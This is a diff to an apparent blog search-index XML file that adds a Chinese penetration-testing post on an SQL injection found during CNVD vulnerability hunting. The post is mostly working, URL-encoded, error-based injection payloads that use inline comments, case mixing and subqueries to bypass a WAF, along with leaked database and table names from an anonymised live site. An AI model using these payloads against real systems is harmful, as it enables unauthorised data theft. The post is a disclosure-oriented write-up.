@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CNVD挖掘过程中的一次SQL注入分析</title>
+      <link href="/2024/01/30/%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/"/>
+      <url>/2024/01/30/%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E8%AE%B0%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-渗透目标"><a href="#1-渗透目标" class="headerlink" title="1.渗透目标"></a>1.渗透目标</h2><p>https:&#x2F;&#x2F;[某站点]&#x2F;new.php?id&#x3D;</p><h2 id="2-绕WAF"><a href="#2-绕WAF" class="headerlink" title="2.绕WAF"></a>2.绕WAF</h2><p>闭合方式判断<br><img src="https://cdn.jsdelivr.net/gh/0Rec1us/picorep//img/20240130152312.png" width="100%" height="auto"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; --+ </span><br><span class="line">//报错为 &#x27;&#x27;&#x27;  -&gt; --+被过滤</span><br><span class="line"></span><br><span class="line">用以下方式都可以过</span><br><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; || &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>报错注入注库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%27%20||%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))%20||%20%271%27=%271</span><br><span class="line">//XPATH syntax error: &#x27;~iibnbnet_unidatabase~&#x27;</span><br></pre></td></tr></table></figure><p>报错注入注表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%27%20||%20extractvalue(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27iibnbnet_unidatabase%27%20limit%200,1),0x7e))%20||%20%271%27=%271</span><br><span class="line">//无内容返回，语句整体为真 -&gt; 查表名语句被过滤</span><br><span class="line"></span><br><span class="line">内联注释</span><br><span class="line">1%27%20||%20extractvalue(1,concat(0x7e,(/*!select*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!where*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271</span><br><span class="line">//无内容返回，语句整体为真 </span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line">id=1%27%20||%20extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271</span><br><span class="line">//无内容返回，语句整体为真</span><br><span class="line"></span><br><span class="line">hex编码绕过</span><br><span class="line">//无返回内容，语句整体为真</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想到了第一步的\可以爆出前后语句从而判断是否有语句被过滤，但是把查语句一个一个带进去后发现所有单独的词都没被过滤，判断是组合语句过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对语句做内联注释</span><br><span class="line">?id=1%27%20||%20/*!extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))*/%20||%20%271%27=%271</span><br><span class="line">//You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;/ || &#x27;1&#x27;=&#x27;1&#x27;&#x27; at line 1</span><br><span class="line">//有可能)+*被过滤，最后的注释符没起作用</span><br><span class="line"></span><br><span class="line">将最后的注释符位置改到最后</span><br><span class="line">?id=1%27%20||%20/*!extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271*/</span><br><span class="line">//成功取出表名</span><br><span class="line">//XPATH syntax error: &#x27;~uni_albumlist~&#x27;</span><br><span class="line"></span><br><span class="line">//把/*!位置往前放也可以绕过</span><br><span class="line">?id=1/*!%27%20||%20extractvalue(1,concat(0x7e,(/*!sElect*/%20/*!table_name*/%20/*!from*/%20/*!information_schema.tables*/%20/*!wHere*/%20/*!table_schema=%27iibnbnet_unidatabase%27*/%20/*!limit%200,1*/),0x7e))%20||%20%271%27=%271*/</span><br><span class="line">//XPATH syntax error: &#x27;~uni_albumlist~&#x27;</span><br></pre></td></tr></table></figure><p>用子查询也可绕过waf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=(SELECT%201%20FROM%20dual%20WHERE%201%27%20||extractvalue(1,concat(0x7e,(/*!select*/%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20like%20%27iibnbnet_unidatabase%27),0x7e))||%20%271%27=%271)</span><br><span class="line">//where之后的即是我们原来的payload</span><br></pre></td></tr></table></figure><p>后续列名与表信息采用相同方法可以绕过waf。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透实战 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>文件包含+phpinfo组合拿下站点</title>
       <link href="/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+phpinfo%E7%BB%84%E5%90%88%E6%8B%BF%E4%B8%8B%E7%AB%99%E7%82%B9/"/>
       <url>/2024/01/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+phpinfo%E7%BB%84%E5%90%88%E6%8B%BF%E4%B8%8B%E7%AB%99%E7%82%B9/</url>
